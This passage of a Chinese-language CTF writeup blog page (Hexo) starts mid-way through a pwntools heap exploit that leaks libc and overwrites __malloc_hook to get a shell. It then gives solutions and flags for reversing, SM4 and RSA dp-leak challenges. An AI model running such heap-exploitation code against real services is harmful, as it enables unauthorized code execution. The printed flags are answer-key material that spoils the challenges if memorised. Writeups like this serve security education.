class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'Please enter the size of string :'</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">'are : '</span>)</span><br><span class="line"></span><br><span class="line">libc = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)</span><br><span class="line">base = libc<span class="number">-0x3c1b58</span></span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clear</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap</span></span><br><span class="line">add(<span class="number">0x38</span>,cyclic(<span class="number">0x38</span>))</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'Please enter the size of string :'</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">'are : '</span>)</span><br><span class="line"></span><br><span class="line">heap = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)<span class="number">-0x80</span></span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clear</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">add(<span class="number">0x78</span>,<span class="string">'a\n'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'b'</span>*<span class="number">0x18</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">'a\n'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'b\n'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'c\n'</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'a'</span>*<span class="number">0x400</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'Please enter the size of string :'</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; '</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="string">'aaa\x71\x01\n'</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">merges(<span class="string">'5 6 7'</span>) <span class="comment">#attack success</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = base + <span class="number">0x3c1af0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x168</span>,<span class="string">'a'</span>*<span class="number">0xf8</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aa\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">11</span>+p64(base+<span class="number">0x455aa</span>)+p64(base+<span class="number">0x86F70</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(heap))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>FLAG:</strong></p>
+<img src="/2019/08/19/zgc_wp/0x07.png">
+<h2 id="0x08-flat"><a href="#0x08-flat" class="headerlink" title="0x08 flat"></a>0x08 flat</h2><p>这题是用qira做的</p>
+<img src="/2019/08/19/zgc_wp/0x08.png">
+<p>跟踪到check5，看到内存中有一串内容</p>
+<p>观察一波规律</p>
+<p>可以写出下面的脚本拿到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encode:</span><br><span class="line">    <span class="keyword">if</span> ord(i)<span class="number">-17</span> &lt;=ord(<span class="string">'9'</span>) <span class="keyword">and</span> ord(i)<span class="number">-17</span> &gt;= ord(<span class="string">'0'</span>):</span><br><span class="line">        flag += chr(ord(i)<span class="number">-17</span>)</span><br><span class="line">    <span class="keyword">elif</span> i ==<span class="string">'-'</span>:</span><br><span class="line">        flag += <span class="string">'-'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(ord(i)+<span class="number">48</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p><strong>FLAG:</strong></p>
+<p>flag{9bbfa2fc-c8b8-464d-8122-84da0e8e5d71}</p>
+<h2 id="0x09-src-leak"><a href="#0x09-src-leak" class="headerlink" title="0x09 src_leak"></a>0x09 src_leak</h2><p>源码都直接给出来了</p>
+<p>_func1: 平方根</p>
+<p>func2: 二进制中1的个数</p>
+<p>func3: 判断是否为奇数</p>
+<p>func4: 判断是否为素数</p>
+<p>根据题意，x1-x5分别为963，4396，6666，1999，3141的平方，即927369，19324816，44435556，3996001，9865881。而1到10000的整数中共有1229个素数，即x6=1229。</p>
+<p><strong>FLAG:</strong></p>
+<p>flag{927369-19324816-44435556-3996001-9865881-1229}</p>
+<h2 id="0x0A-sm4"><a href="#0x0A-sm4" class="headerlink" title="0x0A sm4"></a>0x0A sm4</h2><p>调库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl.sm4 <span class="keyword">import</span> CryptSM4, SM4_DECRYPT</span><br><span class="line"></span><br><span class="line">key = [<span class="number">13</span>, <span class="number">204</span>, <span class="number">99</span>, <span class="number">177</span>, <span class="number">254</span>, <span class="number">41</span>, <span class="number">198</span>, <span class="number">163</span>, <span class="number">201</span>, <span class="number">226</span>, <span class="number">56</span>, <span class="number">214</span>, <span class="number">192</span>, <span class="number">194</span>, <span class="number">98</span>, <span class="number">104</span>]</span><br><span class="line">c = [<span class="number">46</span>, <span class="number">48</span>, <span class="number">220</span>, <span class="number">156</span>, <span class="number">184</span>, <span class="number">218</span>, <span class="number">57</span>, <span class="number">13</span>, <span class="number">246</span>, <span class="number">91</span>, <span class="number">1</span>, <span class="number">63</span>, <span class="number">60</span>, <span class="number">67</span>, <span class="number">105</span>, <span class="number">64</span>, <span class="number">149</span>, <span class="number">240</span>, <span class="number">217</span>, <span class="number">77</span>, <span class="number">107</span>, <span class="number">49</span>, <span class="number">222</span>, <span class="number">61</span>, <span class="number">155</span>, <span class="number">225</span>, <span class="number">231</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">121</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">60</span>, <span class="number">182</span>, <span class="number">65</span>, <span class="number">101</span>, <span class="number">39</span>, <span class="number">253</span>, <span class="number">250</span>, <span class="number">224</span>, <span class="number">9</span>, <span class="number">204</span>, <span class="number">154</span>, <span class="number">122</span>, <span class="number">206</span>, <span class="number">43</span>, <span class="number">97</span>, <span class="number">59</span>]</span><br><span class="line"></span><br><span class="line">crypt_sm4 = CryptSM4()</span><br><span class="line">crypt_sm4.set_key(key, SM4_DECRYPT)</span><br><span class="line">crypt_sm4.mode=<span class="number">2</span></span><br><span class="line">m = crypt_sm4.crypt_ecb(c)</span><br><span class="line">print(m.decode())</span><br></pre></td></tr></table></figure>
+<p><strong>FLAG:</strong></p>
+<p>flag{1caa96be-4266-4a8e-bd2c-ece977495497}</p>
+<h2 id="0x0B-dp"><a href="#0x0B-dp" class="headerlink" title="0x0B dp"></a>0x0B dp</h2><p>给了e，n，dp，求p，q</p>
+<script type="math/tex; mode=display">
+ed \equiv 1 \pmod {\phi(n)}\\
+dp \equiv d \pmod {(p-1)}</script><p>所以</p>
+<script type="math/tex; mode=display">
+ed = k_1\phi(n)+1 = k_1(p-1)(q-1)+1\\
+dp = k_2(p-1)+d</script><p>所以</p>
+<script type="math/tex; mode=display">
+dp \times e = ek_2(p-1)+k_1(p-1)(q-1)+1</script><p>即</p>
+<script type="math/tex; mode=display">
+dp \times e -1 = (p-1)(ek_2+k_1(q-1))</script><p>显然</p>
+<script type="math/tex; mode=display">
+dp < p-1</script><p>所以</p>
+<script type="math/tex; mode=display">
+(ek_2+k_1(q-1))</script><p>不会比e大。注意到e也不大，可以枚举</p>
+<script type="math/tex; mode=display">
+(ek_2+k_1(q-1))</script><p>求出可能的p，q，若p整除n，则q=n/p</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2, libnum</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901</span></span><br><span class="line">dp=<span class="number">81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097</span></span><br><span class="line">c=<span class="number">5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827</span></span><br><span class="line"></span><br><span class="line">tmp = e * dp - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line">	<span class="keyword">if</span> tmp % i == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">if</span> n % (tmp // i + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">			p = tmp // i + <span class="number">1</span></span><br><span class="line">			q = n // p</span><br><span class="line">			phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">			d = gmpy2.invert(e, phi)</span><br><span class="line">			m = pow(c, d, n)</span><br><span class="line">			print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+<p><strong>FLAG:</strong></p>
+<p>flag{c3009b61-f9ed-4b20-8855-edab53e89530}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/19/hxb-wp/" rel="next" title="湖湘杯2018Writeup--WaterD2op">
+                <i class="fa fa-chevron-left"></i> 湖湘杯2018Writeup--WaterD2op
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Waterdrop</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-签到题"><span class="nav-number">1.</span> <span class="nav-text">0x00 签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-24word"><span class="nav-number">2.</span> <span class="nav-text">0x01 24word</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Game"><span class="nav-number">3.</span> <span class="nav-text">0x02 Game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-七代目"><span class="nav-number">4.</span> <span class="nav-text">0x03 七代目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-whoareyou"><span class="nav-number">5.</span> <span class="nav-text">0x04 whoareyou?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Yasaxi"><span class="nav-number">6.</span> <span class="nav-text">0x05 Yasaxi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-one-string"><span class="nav-number">7.</span> <span class="nav-text">0x06 one_string</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-two-string"><span class="nav-number">8.</span> <span class="nav-text">0x07 two_string</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-flat"><span class="nav-number">9.</span> <span class="nav-text">0x08 flat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-src-leak"><span class="nav-number">10.</span> <span class="nav-text">0x09 src_leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0A-sm4"><span class="nav-number">11.</span> <span class="nav-text">0x0A sm4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0B-dp"><span class="nav-number">12.</span> <span class="nav-text">0x0B dp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Waterdrop</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
